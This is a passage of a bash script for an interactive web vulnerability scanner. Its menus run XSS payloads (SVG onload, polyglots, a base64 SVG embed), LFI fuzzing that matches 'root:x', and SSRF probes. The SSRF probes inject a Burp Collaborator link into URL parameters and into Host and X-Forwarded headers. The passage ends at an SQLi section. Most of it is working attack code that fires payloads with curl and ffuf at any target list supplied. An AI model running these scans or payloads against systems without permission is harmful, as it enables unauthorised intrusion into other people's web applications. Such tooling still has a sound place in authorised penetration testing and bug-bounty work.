⠀⠀⣾⣿⣿⡇⠀⠀⢻⣿⣷⡀⠀⠘⣿⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀
⠀⣼⣿⡿⣿⣿⡄⠀⠈⠻⣿⣿⣷⣿⣿⡿⠃⠀⢀⣿⣿⡇⠀⠀⠀⠀
⣰⣿⣿⠁⠹⣿⣿⣦⡀⠀⠈⠉⠛⠋⠉⠀⠀⣠⣾⣿⡟⠀⠀⠀⠀⠀
⣿⣿⣧⣤⣤⣬⣿⣿⣿⣶⣦⣤⣤⣤⣴⣶⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀
⠙⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀
\e[0m
"
Target
echo "\033[1;31m-------------------------------------------------\033[1;33m "
read -p "[+] Please provide URL.txt file: " url_file
echo "\033[0;31m-------------------------------------------------\033[0;33m "
echo "{+} <sVg/oNloAd=prompt(1)//>                          [1] "
echo "{?} javascript:Polyglot_payload-1                     [2] "
echo "{?} javascript:Polyglot_payload-2                     [3] "
echo "[$] \e[5;92mEnter Custom payload                              [4]\e[0m "
echo "[+] <marquee/onstart=prompt(1)//>                     [5] "
echo "[+] EMBED SVG which contains Base-64-xss Vector       [6]"
echo '[+] <BODY onload!#$%&()*~+-_.,:;?@[/|\]^=prompt(1)>   [7] '
echo "{$}\e[5;1;31m Get reflected Parameters[Gxss]                    [8]\e[0m"
echo "\033[1;31m-------------------------------------------------\033[1;33m "


read -p "[*] Enter your XSS payload (1-8): " xss_choice 
case $xss_choice in
1)
 payload="<sVg/oNloAd=prompt(1)//>"
;;
2)
 payload='javascript:"/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=prompt(1)//>"'
;;
3)
payload="jaVasCript:/*-/*'/*/**/(/* */oNcliCk=prompt(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=prompt(1)//>\x3e"
;;
4)
echo "[!]\e[7;1;97m  Note: Only -->prompt(1) allowed in PAYLOAD!.You have to modify your Payload! \e[0m "
read -p "Please add your custom Payload():- " payload
;;

5)
payload="<marquee/onstart=prompt(1)//>"
;;
6)
payload="<EMBED SRC='data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+cHJvbXB0KDEpOzwvc2NyaXB0Pjwvc3ZnPg==' type='image/svg+xml' AllowScriptAccess='always'></EMBED>"
;;
7)
payload="<BODY onload!#%&()*~+-_.,:;?@[/|\]^=prompt(1)>"
;;
8)
echo "Note:\033[2;37m Please Ignore any Error and wait.\n      all data found in url_Reflected_params.txt file"
echo "\033[1;32m\nFinding Reflected Parameters..."
cat $url_file | grep "=" | Gxss -c 100 -p FUZZ  | tee -a  url_Reflected_params.txt
cat url_Reflected_params.txt | sort -u | anew url_Reflected_params.txt
echo "\e[5;92m \nFinding Done!\e[0m"

;;
*)
echo "\033[0;31m-------------------------------------------------\033[1;33m "
echo "[!] \033[1;31mInvalid choice. Exiting..."

exit 1
;;
esac
echo "\e[5;92m Finding xss...\e[0m"
cat $url_file | gf xss | grep '=' | qsreplace "$payload" | while read host do ; do curl --silent  "$host" | grep -qs "prompt(1)" &&
 echo "$host \033[0;31m [+] \033[0;32m  Vulnerable\n"; done  | tee -a  xss.txt

cat $url_file | grep '=' | qsreplace $payload | while read host do ; do curl --silent  "$host" | grep -qs "prompt(1)" &&
 echo "$host \033[0;31m [+] \033[0;32m  Vulnerable\n"; done  | anew  xss.txt
echo "\e[5;92m Finding Done!\e[0m"
;;

4)
echo "\033[0;31m-------------------------------------------------\033[1;33m "
echo "⣿⣿⣷⡟⠀⠈⠏⠉⠙⢁⣤⣶⣿⠟⡘⣿⣶⣔⢄⡈⠙⢿⣿⣷⣦⡉⢝⠻⢿⣷⣦⣭⣭⣵⡶⠟⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣧⡀⠀⠀⣠⣶⣿⣿⠟⠁⣼⠃⢿⣿⣿⣧⠻⣦⠀⠙⢿⣿⣷⣌⠻⠶⢬⣍⣛⠛⠋⠐⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠖⣰⣿⡿⠋⠁⢀⣾⡟⠀⣯⢻⣿⣿⣷⡙⣷⡄⠀⠙⣿⣿⣦⠀⠀⠙⢿⣷⣄⠢⣤⣬⣿⣿⣻⣛⣟⣿⣿⣿⣿⣻⣿
⣿⣿⡇⣸⢁⣾⠿⠋⠀⠀⣴⣿⠟⠀⢠⠸⣆⠻⣿⣿⣿⡌⢿⣆⠀⠈⢻⣿⣧⡀⠀⠈⢻⣿⣦⣉⠉⠭⢭⣭⣭⣭⣭⣭⣭⣭⡏⢻
⡟⣿⡇⠁⠞⠁⠀⢀⣴⣾⡿⠃⠀⠀⠞⠃⢹⣦⡘⢿⣿⣿⣄⢻⣷⣄⠀⠹⣿⣷⡄⠀⠀⢻⣿⣿⡛⢒⣒⣈⣛⣛⣛⣛⣛⣛⠃⣿
⡇⢃⢃⣀⣊⣡⣴⣿⠟⠋⠀⠀⠀⣼⣿⣿⡆⠻⣿⣆⠉⡻⢿⣆⠨⠻⣧⣄⠈⠻⣿⣦⡀⠀⠻⠿⠿⠒⢈⣹⣿⣿⣿⣿⣿⣿⠀⣿
⣧⡇⡆⣭⣭⡄⠒⢂⠀⠀⠀⠀⡜⣉⠉⠀⡄⠄⠈⣻⣷⡈⠻⢿⣷⣦⡈⢿⣿⣦⣄⡉⠛⠂⠸⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⣿
⣿⡇⡇⣿⡿⠀⢰⣿⠀⠀⢠⣾⠁⣇⠀⢰⢸⣘⣄⠈⠻⢿⣄⠀⠀⠉⠉⠀⠀⠀⠁⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿
⣿⡇⡇⠟⠀⠀⠈⢁⡤⠀⢸⣿⠓⣉⣐⣀⣩⣿⣿⣦⠀⠀⠉⠂⠀⠀⠀⢄⡀⠀⠀⠀⠈⠐⠢⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣧⡀⢀⣠⣼⠃⠘⢧⠐⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡀⠐⢶⣤⠠⢄⣹⡐⣆⡆⣠⣤⣤⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⡟⡇⣿⣿⡏⠀⣰⣌⠷⣴⢸⣿⣿⣿⣿⣿⣿⣿⡏⢈⣿⣷⣴⣤⣿⣿⣿⡏⠘⠋⣼⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣷⡇⣿⡿⠁⠀⣿⣿⠀⠀⠈⢿⣿⣿⣿⡿⠿⠿⢿⣿⡿⠿⢿⣿⣿⣿⣿⠁⠀⠀⠿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡇⣿⣷⢠⣀⣿⡟⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⡋⠉⣩⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠈⠛⠿⣾⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡇⣿⣿⢸⣿⠏⠀⢀⣶⠀⠀⠀⢨⡙⢿⣿⣿⣿⣿⣿⣿⣿⠟⡉⠀⠀⢸⣦⠀⠀⢄⠀⠀⠀⣀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡇⣿⣿⠸⠋⠀⣰⣿⠇⢀⠁⠀⠘⠛⠀⠉⠛⠿⡿⠟⣋⣴⣾⠃⠀⠀⠈⣿⣧⡀⠀⢻⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣿
⣿⣿⡇⣿⣿⠄⠀⣸⠿⠃⠠⠊⠀⠀⠀⢂⠀⠀⠀⠀⠀⠙⣿⡿⠁⡇⠀⠀⠀⠉⢻⡇⠀⣼⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿
⣿⣿⡇⣿⣿⢰⡀⣿⣷⡶⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣾⠟⣠⢇⡇⠀⠀⠀⠀⠀⢿⣦⣻⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿
⣿⣿⡇⣿⣿⢸⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠃⠂⠀⣤⣴⣾⠛⠈⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿
⣿⣿⡇⠿⠛⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"
echo "\e[0m\033[0;31m-------------------------------------------------\033[1;33m "
Target
echo "Testing for LFI vulnerability..."
read -p "[+] Please provide URL.txt file: " url_file
# LFI
echo "\e[5;92m Finding LFI...\e[0m"
W=$(locate LFI-Jhaddix.txt)
cat $url_file | gf lfi | grep '='|qsreplace 'FUZZ' | while read url; do ffuf -u $url -mr "root:x" -w $W ; done | tee -a LFI.txt
echo "\e[5;92m Finding Done!\e[0m"
;;

5)
echo "Testing for SSRF vulnerability..."
echo "\033[0;31m-------------------------------------------------\033[1;33m  "
echo "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢟⣫⣵⡆⣽⡟⣿⡷⢶⣮⣍⡻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⣫⣶⠧⡩⡃⠇⢿⠸⠟⠔⠁⠝⡻⢿⣦⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡿⡁⢉⡔⢅⣴⣶⣶⣾⣿⣿⣿⡎⣷⡹⡎⢯⡹⣮⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣩⢵⢆⡀⣶⠖⡩⡻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⢟⡼⣱⣿⡞⣼⣿⣿⣿⣿⣿⣿⣿⣿⢸⢿⣿⡸⠛⡜⣧⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⣂⢨⣬⣬⣽⣿⣶⣦⣥⡸⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⢏⡾⣱⣿⡿⣱⡿⣿⣿⣿⣿⣿⣿⠿⠿⠃⢸⣿⡧⢸⢸⢹⣇⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣇⡏⣾⣿⣿⣿⣿⣿⠿⣿⡁⢻⣿⣿⣿⣿⣿
⣿⣿⣿⡟⠜⣰⣿⡿⢱⠷⣲⣶⣤⣍⣿⣿⣤⠠⠶⠅⠀⢿⣷⣌⠜⣼⣿⣎⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⡇⠙⠛⢻⣿⡉⠥⠒⠺⣿⢸⣿⣿⣿⣿⣿
⣿⣿⡩⠴⢂⡿⢻⢡⢨⠡⡄⡶⢀⢸⣿⣿⣿⣠⡐⠖⠀⠀⡉⢧⠑⠨⢛⣿⠪⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡧⢸⠁⢀⣐⣽⣿⣷⣤⣥⣤⣯⠀⠙⣿⣿⣿⣿
⣿⡿⢣⠋⠞⡱⣡⡟⠘⣥⣎⣠⣾⣿⣿⣿⣿⣷⣶⣶⣴⡄⢷⣦⡑⡐⣙⢿⠒⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣼⢸⣿⣿⣿⢿⢿⣿⣿⣿⡿⢀⢰⣿⣿⣿⣿
⣯⣤⡆⡞⣴⣾⡏⢀⠄⢿⣿⣿⣿⣿⡙⣟⣿⣿⣿⣿⣿⣿⠘⡜⢧⢳⡨⡕⡄⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡇⡜⣿⣿⣿⠿⠿⢿⣿⣿⢘⢠⣿⣿⣿⣿⣿
⣿⣿⣿⠀⣿⢸⢳⢧⣛⡸⣿⣿⣿⠿⢿⣿⣿⣟⣿⣿⣿⡟⣘⡈⠂⠣⠁⠄⠸⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢀⠇⠙⢿⣷⣯⣭⣷⣿⢏⣸⣶⣿⣿⣿⣿⣿
⣿⣿⣧⣾⡄⢟⡸⡸⢻⣷⡝⢿⣿⣿⣯⣭⣽⣿⣿⡿⠏⡴⢻⡟⣀⢻⢲⢠⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣎⡀⠈⣷⣝⡻⠿⢟⣵⢿⠿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡏⣈⣆⠇⡁⠌⢹⢻⣦⢝⡻⢿⣿⣿⠟⣫⣴⡇⠁⡞⡇⠑⠸⣈⠎⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢃⡄⣧⢻⣿⣿⣿⡇⣿⢴⡸⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣷⢫⣆⠘⢸⡻⢸⣿⣷⣮⣶⣿⣿⢫⡇⠃⣥⣶⣇⢶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠏⣾⣇⢿⡎⣿⣿⣿⢱⣿⢰⣷⠹⠿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⠀⣃⡍⡝⣿⣿⣿⣿⡏⣾⣇⢁⢹⣿⣿⠸⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣛⣫⣥⣶⣿⢸⣿⣿⡌⠿⠜⣿⡿⠾⠟⣼⣿⣧⠹⣶⣬⣝
⣿⣿⣿⣿⣿⣿⠿⢸⣿⣟⢰⠟⣄⣧⢿⢿⣿⡟⡼⡋⡃⣏⢸⣿⡿⢇⡮⣝⡻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣫⣶⣿⣿⣿⣿⣿⣇⣛⣛⠛⣛⡜⣷⣛⣾⠿⣸⣶⣄⢺⣥⣿⣿⣿
⣿⡿⢟⣛⣭⡶⣫⡜⢿⡃⣼⢠⣿⣿⣰⣬⡿⣰⡿⣾⢇⡿⣸⣫⣶⢣⡇⣿⣿⣷⣶⣭⣛⠿⢿⣿⣿⡿⢫⣾⣿⣿⣷⣿⣿⣿⣿⣿⣿⡇⠰⢿⣿⡜⣿⡷⣱⠟⣫⡄⣿⣿⣿⣿⣿
⣶⣾⣿⣿⣿⣿⣿⣿⣟⢡⡙⡞⣛⣛⡣⢟⠣⣛⣿⠄⡌⣾⣿⣯⣷⣿⡇⣿⣿⣿⣿⣿⡿⢟⣷⢶⣮⡐⢛⣿⢹⣿⡿⣸⣿⣿⣿⣿⣿⡇⡜⣷⢮⣝⡈⢑⣵⢏⣿⣿⢸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⠉⣿⢣⣇⢿⣿⣿⣿⣿⣿⡟⣼⣧⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡹⣿⣧⢻⣿⡜⠿⡌⣿⡇⣿⣿⣿⣿⣿⣿⢳⣷⢹⣦⡻⡇⠉⣡⣿⣿⣿⢸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⡚⣹⡜⣿⣿⣿⣿⠟⣼⣏⠙⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡹⣿⣸⣿⣷⠈⠄⡩⢃⣻⠿⠿⠿⠿⠿⢸⣿⣧⣿⣿⡆⣿⣿⣿⣿⣿⡏⠭⠭⠭⠭
⣿⣿⣿⣿⣿⣿⣿⣿⡟⢎⣴⣿⣷⡹⣿⣿⠏⣼⣿⣿⡷⢀⢹⣿⣿⣿⣿⣿⢻⣿⣿⣿⣿⣿⣧⢻⡇⣿⣿⡇⣃⠠⢐⡎⢩⣭⠩⣭⢍⢸⣿⣿⣿⣿⡇⡿⣿⣿⣿⣿⡇⢻⣿⡟⢛
⣿⣿⣿⣿⣿⣿⣿⣿⢱⣷⡍⡻⣿⣧⢻⠏⣼⣿⢟⣡⣾⣿⡎⣿⣿⣿⣿⣿⡇⠿⢟⣛⣛⡻⠿⡇⠇⣿⣿⡇⡋⠰⢸⢱⡼⡇⣇⢿⣸⠈⣿⣿⣿⣿⡇⣷⣾⣿⣿⣿⣇⣆⢿⢇⡏
⣿⣿⣿⣿⣿⣿⣿⢇⣿⣿⣷⡹⣦⣙⠇⡼⢋⣴⣿⣿⣿⣿⣿⡸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⣿⣿⣷⠇⣀⠀⣿⣇⢸⣿⠀⣿⢸⡜⢿⣿⣿⡇⣿⣿⣿⣿⣿⣿⢸⡜⢸⣿"
echo "\e[0m\033[0;31m-------------------------------------------------\033[0;33m "
Target

echo "\033[0;31m-------------------------------------------------\033[0;33m "
echo "{*} SSRF Finding Basic method                                                    [1] "
echo "{*} Check Blind ssrf in Header,Path,Host & check xss via web cache poisoning.    [2] "
echo "\033[1;31m-------------------------------------------------\033[1;33m "
read -p "[*] Enter your SSRF finding  method (1-2): " ssrf_choice 
case $ssrf_choice in 
1)
read -p "[+] Please Provide URL.txt file: " url_file
read -p "[+] Please Past here your BurpCollaborator Link: " burpcollaborator_link
echo "\033[0;31m-------------------------------------------------\033[1;33m "
echo "\e[5;92m Finding SSRF...\e[0m"
cat $url_file |gf ssrf | sort -u |  grep "=" | qsreplace "$burpcollaborator_link" >> ssrf_test_targets.txt; ffuf -c -w ssrf_test_targets.txt -u FUZZ | anew SSRF.txt
echo "\e[5;92m Finding Done!\e[0m"
;;
2)
#Check Blind ssrf in Header,Path,Host & check xss via web cache poisoning.
read -p "Please Provide domains.txt: " domain_file
read -p "[+] Please Past here your BurpCollaborator Link: " burpcollaborator_link

cat $domain_file | while read url; do xss1=$(curl -s -L $url -H "X-Forwarded-For: xss.$burpcollaborator_link "|grep xss) xss2=$(curl -s -L $url -H "X-Forwarded-Host: xss.$burpcollaborator_link "|grep xss) xss3=$(curl -s -L $url -H "Host: xss.$burpcollaborator_link "|grep xss) xss4=$(curl -s -L $url --request-target "http://$burpcollaborator_link" --max-time 2); echo -e "\e[1;32m$url\e[0m""\n""Method[1] X-Forwarded-For: xss+ssrf => $xss1""\n""Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2""\n""Method[3] Host: xss+ssrf ==> $xss3""\n""Method[4] GET http://xss.$burpcollaborator_link  HTTP/1.1 ""\n";done
echo "\e[5;92m Finding Done!\e[0m"

;;
 


*)
echo "\033[0;31m-------------------------------------------------\033[1;33m "
echo "[!] \033[1;31mInvalid choice. Exiting..."
exit 1
;;
esac

;;
6)
echo "Testing for SQLi..."
echo "\033[0;31m-------------------------------------------------\033[1;33m "
echo "⣿⣿⣿⡏⣼⣿⣿⣿⣿⣿⣿⡇⡿⢱⣿⣿⣿⣿⡿⣱⣯⣤⣭⣵⣶⡟⣿⣿⣿⣿⣿⠇⣽⣿⢻⣿⢋⣿⣿⣿⣇⢻⣿⣿⣿⣌⢿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡜⣿⣿
⣿⣿⡟⣼⣿⣿⣿⣿⣿⣿⣿⢱⢣⣿⣿⣿⣿⡟⣱⢻⣿⣿⣿⣿⡿⢸⣿⣿⣿⣿⡟⣼⣿⡿⢸⡿⢸⣿⣿⣿⣿⡸⣿⣿⣿⣿⣧⡙⢿⣿⣿⣦⡹⣿⣿⣿⣿⣿⣿⣿⢷⠹⣿
⣿⣿⢱⣿⣿⣿⣿⣿⢇⣿⠇⢢⣿⣿⣿⡿⢋⣼⣿⢸⣿⣿⣿⣿⢃⣿⣿⣿⣿⢏⣼⣿⡿⢃⣿⢣⢠⣿⣿⢿⣿⣧⢻⣿⣿⣿⣇⠻⣷⣝⡻⣿⣿⣌⢿⣿⣿⣿⣿⣿⡌⣇⢿
⣿⡏⣾⣿⣿⣿⣿⡟⣼⠏⣴⣿⣿⡿⣋⢰⣿⣿⣿⢸⣿⢏⣿⢏⣾⣿⣿⡿⣡⣾⣿⠟⢡⡿⣡⢣⣿⣿⣿⢸⣿⣿⣎⢿⣿⣿⣿⡰⡙⣿⣿⣶⣭⣿⣦⠻⣿⣿⣿⣿⣿⡘⢸
⣿⠁⣿⣿⣿⣿⠟⠜⣡⡾⠿⣋⣵⢰⣿⡆⣿⣿⣿⡆⢋⣾⢏⣾⣿⡿⡫⠸⣿⡿⠋⢀⢏⣴⢃⡆⣿⡿⣿⡆⣿⣿⣿⣎⢻⣿⣿⣧⢻⣌⠻⣿⣿⣿⣿⣷⡹⣿⣿⣿⣿⣧⠁
⣿⢰⣿⣿⡿⠋⣾⡶⢰⣾⠃⣿⣿⠈⣿⠛⡘⣿⣿⣇⠘⠡⢞⢫⣵⠞⠅⠱⠋⣠⣾⣶⣿⢃⢺⣿⡸⣧⢻⣷⢹⣿⣿⣿⣷⡙⢿⣿⣆⠻⣷⣌⠻⢿⣿⣿⣷⡹⣿⣿⠹⣿⡆
⡇⣿⡿⣫⣴⡇⡿⡑⣼⡏⢸⣿⢫⢀⢿⠃⣷⠙⣿⣿⡐⡜⢣⡿⣫⠞⣄⣵⢿⣿⣿⡟⣱⠿⠎⢿⣧⢻⢀⢿⣇⠻⣿⣿⢿⣿⡌⡹⢿⣮⢪⡻⣇⠀⠉⠻⢿⣧⠙⣿⢰⢹⣿
⢹⡿⣰⢱⣿⡇⢣⡇⠟⢠⡿⢣⣿⢸⡘⢸⢹⡆⣌⠿⠃⢔⣩⠾⣡⣾⣿⡟⣼⡿⣫⣴⣶⣿⣷⠈⢻⣧⡁⣎⢿⣆⢌⠻⣧⢙⢿⡜⢦⣝⠣⡙⣮⣑⠙⣷⣤⣐⡀⣌⣸⡆⢿
⣼⡇⡏⡾⢻⢣⣼⡿⢠⢟⣵⡿⣋⡀⣷⠸⡏⠿⢌⣤⡶⢛⣥⣾⣿⢹⣿⢇⣥⣬⣭⣭⣭⣭⣭⣥⠲⡙⢿⣿⣧⡹⣎⢳⣬⡣⠱⣬⣂⣻⢻⣶⣴⣿⣿⣿⣿⣿⣿⣙⣿⣷⢪
⡇⢸⢧⢣⡸⢸⡟⠑⠡⢚⢥⣾⡿⢛⠜⠆⢻⣾⣿⣿⣷⣯⢹⣿⠟⣸⡟⠐⣤⣶⣦⣭⣭⣛⡻⢿⣷⡝⢶⣝⠻⣿⣮⡣⠻⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⢹⣿⢸
⣿⡘⢠⣿⣷⡉⡷⣶⣿⢿⠘⢫⣥⣶⣦⣐⠇⣹⣿⣿⣿⣿⢨⣴⢇⢟⣴⣿⢃⠴⠤⠄⣉⣙⠛⠷⣮⣽⣆⠻⣿⣶⣭⣛⠶⣜⣿⣿⣿⡟⡌⣿⣿⣿⣿⣿⣿⣿⢸⣿⢸⡿⣾
⣿⣷⣙⣿⣿⣷⢰⢿⣿⡜⢸⣿⣿⣿⣟⠫⠴⠛⢙⢿⡟⢿⣆⢛⠄⣛⣵⢡⣾⣿⣿⢨⠃⡘⢘⠷⣦⠉⡛⢸⢣⣿⣿⣿⣿⣿⣿⡇⡿⣡⣅⡛⢿⣿⣿⢻⣿⣿⢸⠇⢸⢇⣿
⣿⣿⣿⣿⣿⡿⢸⡇⡻⣷⡙⣿⠿⠿⣟⣛⡫⣠⣿⢷⣅⡐⠮⢌⢝⠿⣿⣿⣛⠿⣿⣌⣒⣡⣿⡿⢊⡔⣼⢈⣾⣿⡿⢻⣿⣿⣿⢁⣴⠿⣿⠿⣦⡹⡿⢸⣿⡏⡞⣼⠘⣼⣿
⣿⣿⣿⣿⣿⣷⢸⢃⣷⡎⡛⠦⠻⢿⡿⣋⣚⠋⣁⣠⢜⡹⢻⣷⣶⠇⣿⣿⣿⣯⣒⣉⠭⠭⢭⡔⠩⠚⣡⣿⡿⢟⣵⡿⣹⣿⠃⣫⡔⠦⠙⣷⢹⣇⢣⢸⣿⢃⣼⣋⣼⣿⣿
⣿⣿⣿⣿⣿⣿⣧⠛⣿⡇⣿⠿⡋⠀⣼⣿⣿⣿⠘⣛⠳⣾⣦⣝⣋⣾⣿⣿⣿⣿⣿⣿⣿⣏⠑⠬⠵⢟⣛⣩⠶⣛⡭⣰⡟⣡⡜⡻⢇⣿⢇⡟⣼⢇⣿⢸⢇⣾⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣷⣾⣇⠦⢪⢔⠴⣿⣿⣿⣿⣧⢻⠷⣈⣿⣿⣿⣿⣿⣿⣿⡿⢋⣽⣿⢿⡜⣿⠿⣛⣩⣵⡾⠟⢐⣍⢶⣮⡘⣿⣿⠟⡼⣱⢋⣾⣟⣀⣾⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡰⣧⠎⣼⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⢋⣴⡿⢋⣵⣾⣿⣶⣿⣿⣿⣿⣷⡿⢛⣭⣼⣿⠇⣼⣿⣑⠔⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡙⣾⣿⣿⣿⣧⣭⣽⣛⣛⠿⠿⠿⣿⣿⡿⢿⣿⣿⣼⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣧⣥⣶⣮⣥⣾⣿⠟⢫⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡝⢿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣶⡶⣚⣻⣭⣍⠿⢟⡵⣊⣿⣿⣿⣿⣿⢿⢟⠍⣹⣿⣿⡿⢛⣥⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣎⢻⣿⣿⣿⣦⣐⣂⣩⣿⣿⣿⣧⢹⣿⣿⣿⠘⣫⡾⡋⣸⣿⣿⢟⣥⡂⡜⣬⡭⡍⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⡇⣿⣿⡾⢟⣫⣴⣿⣿⣧⠳⠜⠕⣱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⢿⣿⣿⣿⣿⣿⣿⣿⣿⡏⡿⠿⣛⣣⣭⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⢣⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
